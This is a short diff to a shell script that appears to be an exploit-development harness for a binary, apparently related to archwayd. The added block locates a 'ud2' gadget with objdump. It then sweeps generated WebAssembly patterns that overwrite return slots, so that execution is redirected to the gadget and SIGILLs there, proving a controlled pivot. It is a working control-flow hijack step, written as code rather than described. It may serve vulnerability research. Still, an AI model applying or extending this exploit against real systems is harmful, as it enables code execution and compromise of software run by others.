@@ -165,6 +165,21 @@ else
   echo "archwayd unavailable; skipping E6c" | tee "$OUT/archwayd_info.txt"
 fi
 
+# E6a-v3: aim the pivot at a `ud2` gadget — all planted slots hold the gadget address, so a
+# return-slot overwrite transfers execution to it and SIGILLs with fault_addr == the gadget
+# (direct proof of the aimed pivot).
+UD2_OFF=$(objdump -d "$BIN" 2>/dev/null | grep -m1 -E '^\s*[0-9a-f]+:\s+0f 0b\s' | awk '{print $1}' | tr -d ':')
+if [ -z "$UD2_OFF" ]; then echo "no ud2 gadget found" | tee -a "$OUT/sweep.log"; else echo "ud2 gadget offset: 0x$UD2_OFF" | tee -a "$OUT/sweep.log"; fi
+if [ -n "$UD2_OFF" ]; then
+  for R in $(seq 234 300); do
+    OFF=$((512 - R))
+    PAT="patterns/ws_load_r${R}.wat"
+    [ -f "$PAT" ] || python3 gen_writestream.py "$PAT" 512 "$OFF" load > /dev/null
+    ITERS=$((65536 + R + 1))
+    run_nested lab-422-sp "$PAT" "$ITERS" 1 "ud2_r${R}" "patterns/ws_drift.wat" 8 7 "0x$UD2_OFF" 0x0
+  done
+fi
+
 echo "=== results ==="
 ls -la "$OUT"
 exit 0
